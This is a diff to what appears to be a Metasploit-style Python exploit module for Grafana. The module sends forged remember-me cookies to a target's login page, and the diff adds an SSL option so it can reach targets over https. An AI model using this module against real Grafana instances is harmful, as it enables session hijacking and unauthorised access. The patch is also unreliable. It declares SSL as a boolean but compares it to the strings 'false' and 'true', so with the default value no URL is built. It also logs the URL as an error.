@@ -38,7 +38,8 @@ metadata = {
         'RHOSTS': {'type': 'address', 'description': 'Address of target', 'required': True, 'default': '127.0.0.1'},
         'RPORT': {'type': 'port', 'description': 'Port of target', 'required': True, 'default': 3000},
         'COOKIE': {'type': 'string', 'description': 'Decrypt captured cookie', 'required': False},
-        'BASEURL': {'type': 'string', 'description': 'Base URL of grafana instance', 'required': False, 'default' : '/'}
+        'BASEURL': {'type': 'string', 'description': 'Base URL of grafana instance', 'required': False, 'default' : '/'},
+        'SSL': {'type': 'bool', 'description': 'set SSL/TLS based connection', 'required': True, 'default' : False}
     }
 }
 
@@ -133,11 +134,17 @@ def run(args):
     try:
         cookies = { 'grafana_remember':cookie, 'grafana_user':username }
         
-        if args['BASEURL'].endswith('/'): 
-            url="http://"+args['RHOSTS']+":"+args['RPORT']+args['BASEURL']+"login/"
-        else:
-            url="http://"+args['RHOSTS']+":"+args['RPORT']+args['BASEURL']+"/login/"
-        
+        if args['SSL'] == "false":
+            if args['BASEURL'].endswith('/'): 
+                url="http://"+args['RHOSTS']+":"+args['RPORT']+args['BASEURL']+"login/"
+            else:
+                url="http://"+args['RHOSTS']+":"+args['RPORT']+args['BASEURL']+"/login/"
+        elif args['SSL'] == "true":
+            if args['BASEURL'].endswith('/'): 
+                url="https://"+args['RHOSTS']+":"+args['RPORT']+args['BASEURL']+"login/"
+            else:
+                url="https://"+args['RHOSTS']+":"+args['RPORT']+args['BASEURL']+"/login/"
+        module.log(url, "error")
         r = requests.get(url=url, cookies=cookies, allow_redirects=False)
     
     except:
